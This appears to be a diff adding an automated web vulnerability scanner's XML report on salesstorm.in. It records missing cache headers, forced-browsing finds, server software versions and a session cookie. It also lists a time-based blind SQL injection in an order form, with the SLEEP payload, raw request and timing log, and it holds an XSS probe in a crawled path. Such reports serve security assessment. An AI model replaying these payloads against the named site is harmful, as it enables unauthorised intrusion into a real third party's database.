@@ -1,0 +1,476 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<Scan scanname="https://salesstorm.in/" friendlyname="Sales Storm">
+  <sections>
+    <section>
+      <plugin>
+        <id>41</id>
+        <title>Server Misconfiguration</title>
+        <threattype>Weakness</threattype>
+        <shortname />
+        <shortdescription>&lt;p&gt;Server Misconfiguration attacks exploit configuration weaknesses found in web servers and application servers. Many servers come with unnecessary default and sample files, including applications, configuration files, scripts, and web pages. They may also have unnecessary services enabled, such as content management and remote administration functionality. Debugging functions may be enabled or administrative functions may be accessible to anonymous users. These features may provide a means for a hacker to bypass authentication methods and gain access to sensitive information, perhaps with elevated privileges.&lt;/p&gt;
+
+        &lt;p&gt;Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. All these settings should be defined, implemented, and maintained as many are not shipped with secure defaults. This includes keeping all software up to date, including all code libraries used by the application.&lt;/p&gt;
+        </shortdescription>
+        <classvariant />
+        <synopsis>Browsers can store sensitive information for purposes of caching and history.</synopsis>
+        <background>Unless directed otherwise, browsers may store a local cached copy of content received from web servers. Some browsers, including Internet Explorer, cache content accessed via HTTPS. If sensitive information in application responses is stored in the local cache, then this may be retrieved by other users who have access to the same computer at a future time.
+        </background>
+        <remediation>Instruct the browser not to store local copies of returned data by adding the following HTTP response headers:
+        Cache-Control: no-cache, no-store, must-revalidate
+        Pragma: no-cache
+        Expires: 0
+
+        For ASP.NET pages, you can set cacheability by using values in the HttpCacheability enumeration.
+        See http://msdn.microsoft.com/en-us/library/system.web.httpcachepolicy.setcacheability(v=vs.110).aspx
+        </remediation>
+        <references>
+          <reference type="WASC2.0">WASC-14</reference>
+        </references>
+        <cwelist />
+      </plugin>
+      <vulnerabilities>
+        <instance>
+        <dos>False</dos>
+        <pluginid>41</pluginid>
+        <status>0bb44ff3-79e4-4045-b996-26abfa069caa</status>
+        <risklevel>1</risklevel>
+        <cvssbasescore>1.9</cvssbasescore>
+        <cvssvector>(AV:L/AC:M/Au:N/C:P/I:N/A:N)</cvssvector>
+        <cwssvector />
+        <cwssbasescore>0</cwssbasescore>
+        <element>
+          <type>header field</type>
+          <name><![CDATA[Pragma HTTP header]]></name>
+        </element>
+        <injections />
+        <request>
+          <headers>
+            <h>
+          <name>Host</name>
+          <val><![CDATA[salesstorm.in]]></val>
+        </h>
+        <h>
+          <name>User-Agent</name>
+          <val><![CDATA[Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4]]></val></h><h>
+          <name>Pragma</name>
+          <val><![CDATA[no-cache]]></val>
+        </h>
+      <h>
+      <name>Cache-Control</name>
+      <val><![CDATA[no-cache]]></val>
+      </h>
+    </headers>
+    <id><![CDATA[00000000-0000-0000-0000-000000000000]]></id>
+    <crc><![CDATA[-1]]></crc>
+    <url><![CDATA[https://salesstorm.in/]]></url>
+    <method><![CDATA[GET]]></method>
+    <isformreturn><![CDATA[False]]></isformreturn>
+    <raw><![CDATA[GET / HTTP/1.0
+Host: salesstorm.in
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+
+]]></raw><querystring><![CDATA[]]></querystring>
+</request>
+<response>
+  <code>200</code>
+<headers>
+  <h>
+    <name>Date</name>
+    <val><![CDATA[Tue, 03 Apr 2018 12:12:45 GMT]]></val>
+  </h>
+  <h>
+<name>Server</name>
+<val><![CDATA[Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4]]></val>
+</h>
+<h>
+<name>X-Powered-By</name>
+<val><![CDATA[PHP/5.5.38]]></val>
+</h>
+<h>
+  <name>Vary</name>
+  <val><![CDATA[Accept-Encoding]]></val>
+</h>
+<h>
+<name>Connection</name>
+<val><![CDATA[close]]></val>
+</h>
+<h>
+  <name>Content-Type</name>
+  <val><![CDATA[text/html]]></val>
+</h>
+</headers>
+<rawheader><![CDATA[HTTP/1.1 200 OK
+Date: Tue, 03 Apr 2018 12:12:45 GMT
+Server: Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4
+X-Powered-By: PHP/5.5.38
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html]]></rawheader>
+<data><![CDATA[<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#" lang="en">
+<head>
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<!-- <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0" /> -->
+
+    <title>Sale Storm Technology Llp, Brahmand-Thane West, Mumbai - Biometric Attendance Recording System Dealers - Justdial</title>
+	<meta name="Title
+...]]></data>
+</response>
+<issuedetails><![CDATA[Pragma HTTP header is missing in the server's response.]]></issuedetails>
+<baseurl><![CDATA[https://salesstorm.in/]]></baseurl>
+<host><![CDATA[salesstorm.in]]></host>
+<port><![CDATA[443]]></port>
+<protocol><![CDATA[HTTPS]]></protocol>
+</instance>
+</vulnerabilities>
+</section>
+
+<section>
+  <plugin>
+    <id>49</id>
+    <title>Predictable Resource Location</title>
+    <threattype>Attack</threattype>
+    <shortname />
+    <shortdescription>&lt;p&gt;Predictable Resource Location is an attack technique used to uncover hidden web site content and functionality. By making educated guesses via brute forcing an attacker can guess file and directory names not intended for public viewing. Brute forcing filenames is easy because files/paths often have common naming convention and reside in standard locations. These can include temporary files, backup files, logs, administrative site sections, configuration files, demo applications, and sample files. These files may disclose sensitive information about the website, web application internals, database information, passwords, machine names, file paths to other sensitive areas, etc...&lt;br /&gt;
+    This will not only assist with identifying site surface which may lead to additional site vulnerabilities, but also may disclose valuable information to an attacker about the environment or its users. Predictable Resource Location is also known as Forced Browsing, Forceful Browsing, File Enumeration, and Directory Enumeration.&lt;/p&gt;
+
+    &lt;p&gt;Many web applications check URL access rights before rendering protected links and buttons. However, applications need to perform similar access control checks each time these pages are accessed, or attackers will be able to forge URLs to access these hidden pages anyway.
+    &lt;/p&gt;</shortdescription>
+    <classvariant>Hidden resources discovered - common files</classvariant>
+    <synopsis>A path including common file name was successfuly accessed.</synopsis>
+    <background>Forceful browsing is an attack technique used to uncover hidden web site content and functionality. It is possible that over time some files may become unreferenced (unused) by the web application and forgotten about by the administrator/developer. They can be discovered by making educated guesses via brute forcing. During the initial assessment stages of an attack, an attacker will attempt to locate unreferenced directories in the hope that it will assist in further compromise of the web application as they can contain some sensitive information about the website.</background>
+    <remediation>There are two ways to protect against forceful browsing: enforcing an application URL space whitelist and using proper access control.</remediation>
+    <references>
+      <reference type="WASC2.0">WASC-34</reference>
+    </references>
+    <cwelist /></plugin>
+    <vulnerabilities>
+      <instance>
+        <dos>False</dos>
+        <pluginid>49</pluginid>
+        <status>0bb44ff3-79e4-4045-b996-26abfa069caa</status>
+        <risklevel>0</risklevel>
+        <cvssbasescore>0.0</cvssbasescore>
+        <cvssvector>(AV:N/AC:L/Au:N/C:N/I:N/A:N)</cvssvector>
+        <cwssvector>0.8:(TI:L,0.3/AP:N,0.1/AL:Unk,0.5/IC:N,1.0/FC:Unk,0.5/RP:N,1.0/RL:S,0.9/AV:I,1.0/AS:S,0.7/AI:N,1.0/IN:Aut,1.0/SC:All,1.0/BI:C,1.0/DI:H,1.0/EX:H,1.0/EC:N,1.0/RE:E,1.0/P:W,1.0)</cwssvector>
+        <cwssbasescore>32.80</cwssbasescore>
+        <element>
+        <type>URL path</type>
+  <name><![CDATA[robots.txt]]></name></element>
+  <injections />
+  <request>
+    <headers>
+      <h>
+        <name>Host</name>
+        <val><![CDATA[salesstorm.in]]></val>
+      </h>
+      <h>
+        <name>User-Agent</name>
+        <val><![CDATA[Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4]]></val>
+      </h>
+      <h>
+        <name>Pragma</name>
+        <val><![CDATA[no-cache]]></val>
+      </h>
+      <h>
+        <name>Cache-Control</name>
+        <val><![CDATA[no-cache]]></val>
+      </h>
+    </headers>
+    <id><![CDATA[00000000-0000-0000-0000-000000000000]]></id>
+    <crc><![CDATA[-1]]></crc>
+    <url><![CDATA[https://salesstorm.in/robots.txt]]></url>
+    <method><![CDATA[GET]]></method>
+    <isformreturn><![CDATA[False]]></isformreturn>
+    <raw><![CDATA[GET /robots.txt HTTP/1.0
+Host: salesstorm.in
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+
+]]></raw>
+<querystring><![CDATA[]]></querystring>
+</request>
+<response>
+  <code>200</code>
+<headers>
+  <h>
+    <name>Date</name>
+    <val><![CDATA[Tue, 03 Apr 2018 12:12:51 GMT]]></val>
+  </h>
+<h>
+  <name>Server</name>
+  <val><![CDATA[Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4]]></val></h>
+<h>
+  <name>Last-Modified</name>
+  <val><![CDATA[Sun, 25 Jun 2017 18:21:23 GMT]]></val>
+</h>
+<h>
+  <name>ETag</name>
+  <val><![CDATA["150160c-17-552cce6d56cc7"]]></val>
+</h>
+<h>
+  <name>Accept-Ranges</name>
+<val><![CDATA[bytes]]></val>
+</h>
+<h>
+  <name>Content-Length</name>
+  <val><![CDATA[23]]></val>
+</h>
+<h>
+  <name>Vary</name>
+  <val><![CDATA[Accept-Encoding]]></val>
+</h>
+<h>
+  <name>Connection</name>
+  <val><![CDATA[close]]></val>
+</h>
+<h>
+  <name>Content-Type</name>
+  <val><![CDATA[text/plain]]></val>
+</h>
+</headers>
+<rawheader><![CDATA[HTTP/1.1 200 OK
+Date: Tue, 03 Apr 2018 12:12:51 GMT
+Server: Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4
+Last-Modified: Sun, 25 Jun 2017 18:21:23 GMT
+ETag: "150160c-17-552cce6d56cc7"
+Accept-Ranges: bytes
+Content-Length: 23
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/plain]]></rawheader>
+<data><![CDATA[User-agent: *
+Disallow:
+...]]></data>
+</response>
+<issuedetails><![CDATA[Common file found at https://salesstorm.in/robots.txt]]></issuedetails>
+<baseurl><![CDATA[https://salesstorm.in/]]></baseurl><host><![CDATA[salesstorm.in]]></host>
+<port><![CDATA[443]]></port><protocol><![CDATA[HTTPS]]></protocol>
+</instance>
+</vulnerabilities>
+</section>
+
+<section>
+  <plugin>
+    <id>50</id><title>Predictable Resource Location</title>
+    <threattype>Attack</threattype>
+<shortname />
+<shortdescription>&lt;p&gt;Predictable Resource Location is an attack technique used to uncover hidden web site content and functionality. By making educated guesses via brute forcing an attacker can guess file and directory names not intended for public viewing. Brute forcing filenames is easy because files/paths often have common naming convention and reside in standard locations. These can include temporary files, backup files, logs, administrative site sections, configuration files, demo applications, and sample files. These files may disclose sensitive information about the website, web application internals, database information, passwords, machine names, file paths to other sensitive areas, etc...&lt;br /&gt;
+This will not only assist with identifying site surface which may lead to additional site vulnerabilities, but also may disclose valuable information to an attacker about the environment or its users. Predictable Resource Location is also known as Forced Browsing, Forceful Browsing, File Enumeration, and Directory Enumeration.&lt;/p&gt;
+
+&lt;p&gt;Many web applications check URL access rights before rendering protected links and buttons. However, applications need to perform similar access control checks each time these pages are accessed, or attackers will be able to forge URLs to access these hidden pages anyway.
+&lt;/p&gt;</shortdescription>
+<classvariant>Hidden resources discovered - backup files</classvariant>
+<synopsis>A path including common backup file name was successfuly accessed.</synopsis>
+<background>Forceful browsing is an attack technique used to uncover hidden web site content and functionality. It is possible that over time some unintended files' backups appear in web application structure. They can be discovered by making educated guesses via brute forcing. During the initial assessment stages of an attack, an attacker will attempt to locate such backup files in the hope that it will assist in further compromise of the web application as they can contain some sensitive information about the website.</background>
+<remediation>There are two ways to protect against forceful browsing: enforcing an application URL space whitelist and using proper access control.</remediation>
+<references>
+  <reference type="WASC2.0">WASC-34</reference>
+</references>
+<cwelist />
+</plugin>
+<vulnerabilities>
+<instance>
+<dos>False</dos>
+<pluginid>50</pluginid>
+<status>0bb44ff3-79e4-4045-b996-26abfa069caa</status>
+<risklevel>0</risklevel><cvssbasescore>0.0</cvssbasescore>
+<cvssvector>(AV:N/AC:L/Au:N/C:N/I:N/A:N)</cvssvector>
+<cwssvector>0.8:(TI:L,0.3/AP:N,0.1/AL:Unk,0.5/IC:N,1.0/FC:Unk,0.5/RP:N,1.0/RL:S,0.9/AV:I,1.0/AS:S,0.7/AI:N,1.0/IN:Aut,1.0/SC:All,1.0/BI:C,1.0/DI:H,1.0/EX:H,1.0/EC:N,1.0/RE:E,1.0/P:W,1.0)</cwssvector>
+<cwssbasescore>32.80</cwssbasescore><element><type>URL path</type><name><![CDATA[products1.php]]></name>
+</element>
+<injections />
+<request>
+<headers>
+  <h>
+    <name>Host</name>
+    <val><![CDATA[salesstorm.in]]></val></h>
+<h><name>User-Agent</name><val><![CDATA[Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4]]></val></h><h><name>Pragma</name><val><![CDATA[no-cache]]></val></h>
+<h><name>Cache-Control</name><val><![CDATA[no-cache]]></val></h></headers><id><![CDATA[00000000-0000-0000-0000-000000000000]]></id><crc><![CDATA[-1]]></crc><url><![CDATA[https://salesstorm.in/online/products1.php]]></url>
+<method><![CDATA[GET]]></method><isformreturn><![CDATA[False]]></isformreturn><raw><![CDATA[GET /online/products1.php HTTP/1.0
+Host: salesstorm.in
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+
+]]></raw><querystring><![CDATA[]]></querystring></request>
+<response>
+  <code>200</code>
+  <headers><h><name>Date</name><val><![CDATA[Tue, 03 Apr 2018 12:14:20 GMT]]></val></h>
+  <h><name>Server</name><val><![CDATA[Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4]]></val></h>
+  <h><name>X-Powered-By</name><val><![CDATA[PHP/5.5.38]]></val></h>
+<h><name>Expires</name><val><![CDATA[Thu, 19 Nov 1981 08:52:00 GMT]]></val></h><h><name>Cache-Control</name>
+<val><![CDATA[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]]></val></h>
+<h><name>Pragma</name><val><![CDATA[no-cache]]></val></h>
+<h><name>set-cookie</name><val><![CDATA[PHPSESSID=89esgk3ikqov1gcj2ggo2jcr87; path=/]]></val></h>
+<h><name>Vary</name><val><![CDATA[Accept-Encoding]]></val></h><h><name>Connection</name><val><![CDATA[close]]></val></h><h><name>Content-Type</name><val><![CDATA[text/html]]></val></h></headers><rawheader><![CDATA[HTTP/1.1 200 OK
+Date: Tue, 03 Apr 2018 12:14:20 GMT
+Server: Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4
+X-Powered-By: PHP/5.5.38
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=89esgk3ikqov1gcj2ggo2jcr87; path=/
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html]]></rawheader><data><![CDATA[<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<style>
+td{color:grey;border:1px solid #D8D8D8;}
+td.x{width:50px;}
+#pp{width:230px;height:100px;text-align:center;}
+th{border:1px solid #D8D8D8;}
+#essl{width:100%;height:140%;position:absolute;background:yellow;opacity:0.9;margin-left:-8px;}
+#menu{margin-left:-15px;margin-top:120px;width:35px;height:450px;back
+...]]></data></response><issuedetails><![CDATA[Resource backup found at https://salesstorm.in/online/products1.php]]></issuedetails>
+<baseurl><![CDATA[https://salesstorm.in/online/products.php]]></baseurl>
+<host><![CDATA[salesstorm.in]]></host>
+<port><![CDATA[443]]></port>
+<protocol><![CDATA[HTTPS]]></protocol>
+</instance>
+</vulnerabilities></section><section><plugin><id>7</id><title>SQL Injection</title><threattype>Attack</threattype><shortname>[SQLi]</shortname>
+<shortdescription>&lt;p&gt;SQL Injection is an attack technique used to exploit applications that construct SQL statements from user-supplied input. When successful, the attacker is able to change the logic of SQL statements executed against the database.&lt;/p&gt;
+
+&lt;p&gt;Structured Query Language (SQL) is a specialized programming language for sending queries to databases. The SQL programming language is both an ANSI and an ISO standard, though many database products supporting SQL do so with proprietary extensions to the standard language. Applications often use user-supplied data to create SQL statements. If an application fails to properly construct SQL statements it is possible for an attacker to alter the statement structure and execute unplanned and potentially hostile commands. When such commands are executed, they do so under the context of the user specified by the application executing the statement. This capability allows attackers to gain control of all database resources accessible by that user, up to and including the ability to execute commands on the hosting system.&lt;/p&gt;
+
+&lt;p&gt;All Injection flaws, including SQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.&lt;/p&gt;</shortdescription>
+<classvariant>Blind SQL injection (POST parameter)
+</classvariant><synopsis>Application is vulnerable to blind SQL injection</synopsis><background>The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.
+</background><remediation>Implement strong input validation - all user-controllable input must be validated and filtered for illegal characters as well as SQL content.
+Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
+For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.</remediation>
+<references><reference type="WASC2.0">WASC-19</reference>
+</references><cwelist /></plugin>
+<vulnerabilities><instance><dos>False</dos>
+<pluginid>7</pluginid>
+<status>0bb44ff3-79e4-4045-b996-26abfa069caa</status><risklevel>3</risklevel><cvssbasescore>7.5</cvssbasescore><cvssvector>(AV:N/AC:L/Au:N/C:P/I:P/A:P)</cvssvector>
+<cwssvector>0.8:(TI:M,0.6/AP:P,0.9/AL:D,0.9/IC:Unk,0.5/FC:D,0.8/RP:N,1.0/RL:S,0.9/AV:I,1.0/AS:S,0.7/AI:N,1.0/IN:Aut,1.0/SC:All,1.0/BI:C,1.0/DI:H,1.0/EX:H,1.0/EC:N,1.0/RE:E,1.0/P:W,1.0)
+</cwssvector><cwssbasescore>36.70</cwssbasescore><element><type>POST parameter</type><name><![CDATA[des]]></name></element><injections><injection><type>POST parameter</type><elem>POST parameter</elem>
+<elemName>des</elemName>
+<value><![CDATA[a' AND (SELECT * FROM (SELECT(SLEEP(10)))OAxT) AND 'VepZ'='VepZ]]></value>
+</injection>
+</injections>
+<request><payload>des=a' AND (SELECT * FROM (SELECT(SLEEP(10)))OAxT) AND 'VepZ'='VepZ&amp;</payload><headers><h><name>Host</name><val><![CDATA[salesstorm.in]]></val></h><h><name>Cookie</name>
+<val><![CDATA[PHPSESSID=89esgk3ikqov1gcj2ggo2jcr87;]]></val>
+</h><h><name>User-Agent</name><val><![CDATA[Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4]]></val></h><h><name>Pragma</name>
+<val><![CDATA[no-cache]]></val></h><h><name>Cache-Control</name>
+<val><![CDATA[no-cache]]></val></h></headers><id><![CDATA[00000000-0000-0000-0000-000000000000]]></id><crc><![CDATA[-1]]></crc><url><![CDATA[https://salesstorm.in/online/order_confirm.php]]></url>
+<method><![CDATA[POST]]></method><isformreturn><![CDATA[False]]></isformreturn><raw><![CDATA[POST /online/order_confirm.php HTTP/1.0
+Host: salesstorm.in
+Cookie: PHPSESSID=89esgk3ikqov1gcj2ggo2jcr87;
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 68
+Content-Type: application/x-www-form-urlencoded
+
+des=a' AND (SELECT * FROM (SELECT(SLEEP(10)))OAxT) AND 'VepZ'='VepZ&]]></raw>
+<querystring><![CDATA[]]></querystring>
+</request>
+<response>
+  <code>302</code>
+  <headers>
+<h>
+  <name>Date</name>
+  <val><![CDATA[Tue, 03 Apr 2018 12:38:00 GMT]]></val>
+</h>
+<h>
+  <name>Server</name>
+  <val><![CDATA[Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4]]></val>
+</h>
+<h>
+  <name>X-Powered-By</name>
+  <val><![CDATA[PHP/5.5.38]]></val>
+</h>
+  <h>
+    <name>Expires</name>
+  <val><![CDATA[Thu, 19 Nov 1981 08:52:00 GMT]]></val>
+</h>
+  <h>
+    <name>Cache-Control</name>
+    <val><![CDATA[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]]></val>
+</h>
+  <h>
+<name>Pragma</name>
+<val><![CDATA[no-cache]]></val>
+</h>
+<h><name>Location</name>
+<val><![CDATA[order-continue.php]]></val>
+</h>
+<h>
+  <name>Vary</name>
+  <val><![CDATA[Accept-Encoding]]></val>
+</h>
+<h>
+  <name>Connection</name>
+  <val><![CDATA[close]]></val>
+</h>
+<h>
+  <name>Content-Type</name>
+  <val><![CDATA[text/html]]></val>
+</h>
+</headers>
+<rawheader><![CDATA[HTTP/1.1 302 Moved Temporarily
+Date: Tue, 03 Apr 2018 12:38:00 GMT
+Server: Apache/2.2.29 (Unix) mod_ssl/2.2.29 OpenSSL/1.0.1e-fips mod_bwlimited/1.4
+X-Powered-By: PHP/5.5.38
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: order-continue.php
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html]]></rawheader>
+<data><![CDATA[]]></data>
+</response>
+<issuedetails><![CDATA[Blind SQL injection, time-based, injected (attacked) requests take much more time than original (found by crawler). The attack execution path was as follows:
+--> [00  Form] POST https://salesstorm.in/online/order_confirm.php [des=&] [1.01 seconds]
+--> [07  Attack] POST https://salesstorm.in/online/order_confirm.php [des=a' AND (SELECT * FROM (SELECT(SLEEP(5)))OAxT) AND 'VepZ'='VepZ&] [5.94 seconds]
+--> [07  Attack] POST https://salesstorm.in/online/order_confirm.php [des=a' AND (SELECT * FROM (SELECT(SLEEP(10)))OAxT) AND 'VepZ'='VepZ&] [10.98 seconds]
+--> [07  AttackCheck] POST https://salesstorm.in/online/order_confirm.php [des=a' AND (SELECT * FROM (SELECT(SLXXP(10)))OAxT) AND 'VepZ'='VepZ&] [0.95 seconds]]]></issuedetails>
+<baseurl><![CDATA[https://salesstorm.in/online/order_confirm.php]]></baseurl><host><![CDATA[salesstorm.in]]></host><port><![CDATA[443]]></port>
+<protocol><![CDATA[HTTPS]]></protocol>
+</instance></vulnerabilities></section></sections><resources><resource><id>1</id><name>https://salesstorm.in/</name>
+<founddatetime>04/03/2018 12:12:46</founddatetime>
+</resource><resource><id>2</id><name>https://salesstorm.in/essl/index.html</name><founddatetime>04/03/2018 12:12:47</founddatetime>
+</resource><resource><id>3</id>
+<name>https://salesstorm.in/tvs/index.html</name><founddatetime>04/03/2018 12:12:47</founddatetime></resource><resource><id>4</id><name>https://salesstorm.in/contactus.php</name>
+<founddatetime>04/03/2018 12:12:47</founddatetime></resource><resource><id>5</id><name>https://salesstorm.in/aboutus.php</name>
+<founddatetime>04/03/2018 12:12:48</founddatetime>
+</resource><resource><id>6</id><name>https://salesstorm.in/GPS/index.html</name><founddatetime>04/03/2018 12:12:48</founddatetime></resource><resource><id>7</id>
+<name>https://salesstorm.in/online/products.php</name><founddatetime>04/03/2018 12:12:50</founddatetime></resource><resource><id>8</id>
+<name>https://salesstorm.in/essl/essl-p22.php</name>
+<founddatetime>04/03/2018 12:12:53</founddatetime></resource><resource><id>9</id><name>https://salesstorm.in/essl/</name><founddatetime>04/03/2018 12:12:54</founddatetime></resource>
+<resource><id>10</id><name>https://salesstorm.in/tvs/</name><founddatetime>04/03/2018 12:12:55</founddatetime></resource>
+<resource><id>11</id>
+<name>https://salesstorm.in/essl.php</name><founddatetime>04/03/2018 12:12:56</founddatetime></resource><resource><id>12</id><name>https://salesstorm.in/online/audio/qr.m4a</name>
+<founddatetime>04/03/2018 12:12:59</founddatetime></resource><resource><id>13</id><name>https://salesstorm.in/online/audio/</name>
+<founddatetime>04/03/2018 12:13:13</founddatetime>
+</resource><resource><id>14</id><name>https://salesstorm.in/online/audio/csd200.m4a</name><founddatetime>04/03/2018 12:13:15</founddatetime></resource><resource><id>15</id>
+<name>https://salesstorm.in/images/</name><founddatetime>04/03/2018 12:13:16</founddatetime></resource><resource>
+<id>16</id><name>https://salesstorm.in/GPS/</name>
+<founddatetime>04/03/2018 12:13:23</founddatetime></resource><resource><id>17</id><name>https://salesstorm.in/online/audio/postit.m4a</name><founddatetime>04/03/2018 12:13:32</founddatetime>
+</resource><resource><id>18</id><name>https://salesstorm.in/online/audio/emlock.m4a</name>
+<founddatetime>04/03/2018 12:13:37</founddatetime>
+</resource><resource><id>19</id><name>https://salesstorm.in/online/audio/f12.m4a</name><founddatetime>04/03/2018 12:13:38</founddatetime></resource>
+<resource><id>20</id>
+<name>https://salesstorm.in/tech.php</name><founddatetime>04/03/2018 12:13:46</founddatetime></resource>
+<resource><id>21</id><name>https://salesstorm.in/robots.txt</name>
+<founddatetime>04/03/2018 12:14:00</founddatetime></resource><resource><id>22</id><name>https://salesstorm.in/online/products1.php</name><founddatetime>04/03/2018 12:36:37</founddatetime>
+</resource><resource><id>23</id><name>https://salesstorm.in/online/order_summary.php</name>
+<founddatetime>04/03/2018 12:36:39</founddatetime></resource>
+<resource><id>24</id><name>https://salesstorm.in/online/order.php</name><founddatetime>04/03/2018 12:36:39</founddatetime></resource><resource><id>25</id>
+<name>https://salesstorm.in/online/termsacondition.php/</name>
+<founddatetime>04/03/2018 12:36:45</founddatetime></resource><resource><id>26</id><name>https://salesstorm.in/online/termsacondition.php/aboutus.php</name>
+<founddatetime>04/03/2018 12:36:47</founddatetime>
+</resource><resource><id>27</id><name>https://salesstorm.in/online/termsacondition.php/essl.php</name><founddatetime>04/03/2018 12:36:48</founddatetime></resource>
+<resource><id>28</id>
+<name>https://salesstorm.in/online/order-continue.php</name><founddatetime>04/03/2018 12:36:51</founddatetime>
+</resource><resource><id>29</id><name>https://salesstorm.in/online/termsacondition.php/"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</name><founddatetime>04/03/2018 12:36:51</founddatetime>
+</resource>
+</resources><information><scanid>a39eca6d-53db-43f6-8d58-84bcb6708efe</scanid><statusid>1</statusid><statusdetails>RUNNING_REPORTING</statusdetails><startdatetime>2018-04-03 12:12:44</startdatetime>
+<enddatetime>2018-04-03 12:39:21</enddatetime><statistics /><totaltime>0</totaltime><exitcode>0</exitcode><exitcodemessage /></information></Scan>
